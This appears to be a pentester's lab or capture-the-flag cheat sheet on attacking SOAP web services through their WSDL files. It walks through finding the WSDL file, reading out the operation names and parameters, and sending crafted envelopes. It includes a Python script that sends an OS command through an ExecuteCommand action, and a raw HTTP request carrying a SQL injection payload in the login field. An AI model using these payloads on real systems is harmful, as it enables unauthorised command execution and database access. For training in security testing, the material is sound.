**WSDL Attack**
Web Services Description Language is a XML file that usually(might not be visible if DEVs decided so) is visible from a WebService and it scope is to explain the web-app structure, parameters, action and how you call them and so on. All this is used via SOAP requests.


## How to identify?
Fuzzing baby! Run FFUF/Dirseach and check for possible files **/wsdl**. Usually might be either ***.wsdl** or ***.disco**(microsoft based).


## Hot to read them?
just curl/browser to http://IP:PORT/wsdl?wsdl and you should get back a list of all SOAP/API/WEBSERVICE structure.


## How to attack?
You need to find some information first before and to do so just analyze the **/wsdl?wsdl** file and look for:

1)Action names (usually toward the end of the file)
```
  <!-- SOAP ExecuteCommand Action -->
        <wsdl:operation name="ExecuteCommand">
            <soap:operation soapAction="ExecuteCommand" style="document"/>

```
2)Check if soap-body is present under actions(if Literal then means no encoding is applied). 
This is important as it tells us the payload is read from soap:body as it is which means we have to put our payload into soap:body
```
wsdl:input>
                <soap:body use="literal"/>
            </wsdl:input>

```
3)Check for Data types, usually at the beginning of the XML (this will tell you the variable names and type that the web-app is expecting to get ex strings and so on)
```
<s:element name="ExecuteCommandRequest">
                <s:complexType>
                    <s:sequence>
                        <s:element minOccurs="1" maxOccurs="1" name="cmd" type="s:string"/>
                    </s:sequence>
                </s:complexType>
```
4)Find the right IP:PORT where the payload need to be send(here you should know from the challenge)


### Exploit time
You can use a minifier/beautifier for XML to make your life easier...
Now we have all the information to prepare our python payload so we can use this as base:
```
import requests
payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></LoginRequest></soap:Body></soap:Envelope>'
print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
```
Here we have to adjust:
1)**TargetIP:port** in the POST request at the end
2)Change the **SOAPAction: "NAMEFROMSTEP1"**
(Remember that name must contain " as described in **wsdl** file otherwise will tell you that SOAP headers are missing)
3)Change the tags for data type from STEP 3: in our example we used <cmd>STRING_HERE</cmd>  if we wanted to use the **SOAPAction: "Login"** then we had to use <username>NAME</username><password>PASSWORD</password>   instead
4)Lastly if everything is right then you should get back a response from the WEBSERVICE. OBS: It might happen that server hangs and you get nothing back but that might be a good  result, as for error you will get back a error verbose instead...

**EXTRA: you can translate the same in Burp**
This is useful if then you want to send this to SQLMap for SQLi and so on.

```
POST /wsdl HTTP/1.1
Host: 10.129.202.133:3002
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-US,en
Accept-Encoding: gzip, deflate, br
Connection: close
Content-Length: 428
SOAPAction: "Login"

<?xml version='1.0' encoding='utf-8'?><soap:Envelope xmlns:soap='http://schemas.xmlsoap.org/soap/envelope/' xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance' xmlns:tns='http://tempuri.org/' xmlns:tm='http://microsoft.com/wsdl/mime/textMatching/'><soap:Body><LoginRequest xmlns='http://tempuri.org/'><username>admin' union select 1,2,3,4,5--</username><password>admin</password></LoginRequest></soap:Body></soap:Envelope>

```
